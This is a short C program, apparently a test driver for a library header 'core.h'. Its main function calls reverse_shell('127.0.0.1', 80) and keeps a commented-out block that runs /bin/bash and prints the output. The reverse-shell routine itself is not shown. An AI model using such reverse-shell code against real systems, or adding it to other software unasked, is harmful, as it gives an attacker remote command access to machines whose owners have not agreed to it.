#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "core.h"

int main()
{
	/*
	int i;
	char *output;

	exec("/bin/bash", &output);

	i = 0;
	while(output[i] != '\0') {
		printf("%c", output[i]);
		i++;
	}*/

	reverse_shell("127.0.0.1", 80);

	//free(output);

	return 0;
}